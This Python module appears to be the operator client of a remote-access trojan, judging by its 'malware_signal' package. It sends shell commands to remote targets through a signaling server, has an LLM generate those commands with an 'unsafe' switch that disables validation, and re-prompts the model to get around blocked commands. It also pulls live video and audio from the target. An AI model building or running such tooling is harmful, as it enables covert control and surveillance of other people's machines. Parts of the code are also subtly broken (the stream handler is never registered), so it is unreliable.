#command/bash/shell.py
import asyncio
import cv2
import os
from app.tools.tool_utilities.ai_utils import _fallback_command, _extract_command_text
from app.tools.tool_utilities.command_validator import CommandValidator
from app.core.ai.groq import GroqProvider
from app.core.ai.pipeline import AICommandPipeline
from app.malware_signal.peer import Peer
from app.malware_signal.signal import SignalClient
from app.core.data.config import HOST, ROOM
from app.core.data.client import client_id, username
from app.tools.tool_utilities.remote_command_handler import RemoteCommandHandler as SenderHandler
from app.tools.tool_utilities.media import show_video


def _load_system_prompt() -> str:
    """Load system prompt from prompt/prompt.md if available."""
    prompt_path = os.path.join(os.path.dirname(__file__), '../../../prompt/prompt.md')
    if os.path.exists(prompt_path):
        try:
            with open(prompt_path, 'r') as f:
                return f.read()
        except Exception as e:
            print(f"[!] Could not load custom prompt: {e}")
    return None


async def single_bash_mode(target, command):
    print("[+] SINGLE BASH MODE")
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    await signal.connect()

    sender = SenderHandler(signal)
    listener_task = asyncio.create_task(signal.listen())

    try:
        result = await sender.send_command(target, command, wait_for_result=True, timeout=15)
        if result is None:
            print("[-] NO RESPONSE RECEIVED FOR REMOTE COMMAND EXECUTION")
        if result.get("status") == "success":
            print(result.get("output"), "[+] BASH EXECUTED SUCCESSFULLY")
        else:
            print("[!] BASH FAILED")
            print(f"[-] REMOTE COMMAND EXECUTION FAILED: {result.get('error', 'Unknown error')}")
    finally:
        listener_task.cancel()
        try:
            await listener_task
        except asyncio.CancelledError:
            pass
        await signal.close()


async def ai_bash_mode(target, prompt, provider=None, unsafe: bool = False):
    print("[+] AI BASH MODE (Enhanced Pipeline)")
    if unsafe:
        print("[⚠️] UNSAFE MODE ENABLED - All command restrictions disabled")
    
    # Initialize provider and pipeline
    if provider is None:
        try:
            provider = GroqProvider()
        except Exception as exc:
            print(f"[-] AI PROVIDER INITIALIZATION FAILED: {exc}")
            print("[!] Using fallback command instead")
            fallback_cmd = _fallback_command(prompt)
            await _execute_command(target, fallback_cmd)
            return
    
    # Load custom system prompt if available
    custom_prompt = _load_system_prompt()
    
    pipeline = AICommandPipeline(provider=provider, max_retries=3, system_prompt=custom_prompt)
    
    # Prepare target information for better context
    target_info = {"target_host": target}
    
    # Main retry loop
    for attempt in range(pipeline.max_retries):
        try:
            print(f"\n[*] Attempt {attempt + 1}/{pipeline.max_retries}")
            
            # Step 1: Generate command with context
            print("[*] Generating command with AI...")
            try:
                response = pipeline.generate_command(
                    prompt, 
                    target_info, 
                    include_history=(attempt > 0)
                )
                print(f"[DEBUG] Raw LLM response: {repr(response)[:200]}")  # Show first 200 chars
                generated_command = _extract_command_text(response)
            except Exception as exc:
                print(f"[-] AI GENERATION FAILED: {exc}")
                print("[!] Using fallback command...")
                generated_command = _fallback_command(prompt)
            
            if not generated_command:
                print("[-] FAILED TO GENERATE VALID COMMAND")
                generated_command = _fallback_command(prompt)
            
            # Step 2: Validate command safety
            print(f"[*] Validating command: {generated_command}")
            is_safe, validation_reason = CommandValidator.validate(generated_command, unsafe=unsafe)
            
            if not is_safe:
                print(f"[!] COMMAND VALIDATION FAILED: {validation_reason}")
                print(f"[-] Command blocked: {generated_command}")
                if attempt < pipeline.max_retries - 1:
                    prompt = f"{prompt}\n[BLOCKED: {validation_reason}. Generate a different command]"
                    continue
                else:
                    print("[!] Max retries reached. Using safe fallback...")
                    generated_command = _fallback_command(prompt)
            
            print(f"[✓] GENERATED COMMAND: {generated_command}")
            
            # Step 3: Execute command
            result = await _execute_command(target, generated_command, timeout=300)
            
            if result and result.get("status") == "success":
                # Record success
                pipeline.record_success(prompt, generated_command, result)
                print("[✓] COMMAND EXECUTED SUCCESSFULLY")
                return
            else:
                # Record failure and retry with context
                error_msg = result.get("error", "Unknown error") if result else "No response"
                pipeline.record_failure(prompt, generated_command, error_msg)
                print(f"[-] COMMAND FAILED: {error_msg}")
                
                if attempt < pipeline.max_retries - 1:
                    print(f"[*] Retrying with error context...")
                    prompt = f"{prompt}\n[Previous command failed with: {error_msg}]"
                    continue
                else:
                    print("[!] All retry attempts exhausted")
                    return
        
        except Exception as exc:
            print(f"[!] UNEXPECTED ERROR: {exc}")
            if attempt < pipeline.max_retries - 1:
                print("[*] Retrying...")
                continue
            else:
                return
    
    print("[-] FAILED TO EXECUTE COMMAND AFTER ALL RETRIES")


async def _execute_command(target: str, command: str, timeout: int = 300) -> dict:
    """
    Execute a command on a remote target.
    
    Args:
        target: Target host
        command: Command to execute
        timeout: Timeout in seconds
        
    Returns:
        Result dictionary with status and output/error
    """
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    await signal.connect()
    
    sender = SenderHandler(signal)
    listener_task = asyncio.create_task(signal.listen())
    
    try:
        result = await sender.send_command(
            target=target, 
            command=command, 
            wait_for_result=True, 
            timeout=timeout
        )
        
        if result is None:
            print("[-] NO RESPONSE RECEIVED FOR REMOTE COMMAND")
            return {"status": "error", "error": "No response from target"}
        
        if result.get("status") == "success":
            output = result.get("output", "Command executed successfully")
            print(f"[+] OUTPUT:\n{output}")
            return result
        else:
            error = result.get("error", "Unknown error")
            print(f"[-] ERROR: {error}")
            return result
    
    finally:
        listener_task.cancel()
        try:
            await listener_task
        except asyncio.CancelledError:
            pass
        await signal.close()


async def stream_mode(target):
    print("[+] CONNECTING TO STREAM")

    signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username)
    await signal.connect()

    peer = Peer(signal)
    stop_event = asyncio.Event()

    peer.pc.addTransceiver("video", direction="recvonly")
    peer.pc.addTransceiver("audio", direction="recvonly")

    async def track_handler(track):
        print("[+] INCOMING REMOTE TRACK, SCHEDULING DISPLAY TASK")
        await show_video(track, stop_event)

        peer.on_track = track_handler

        try:
            await peer.create_offer(target)
        except Exception as exc:
            print(f"[!] FAILED TO CREATE OFFER: {exc}")
            await peer.close()
            await signal.close()
            return

        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            print("SHUTDOWN REQUESTED")
            raise
        finally:
            print("CLOSING PEER AND SIGNALING CONNECTION")
            await peer.close()
            await signal.close()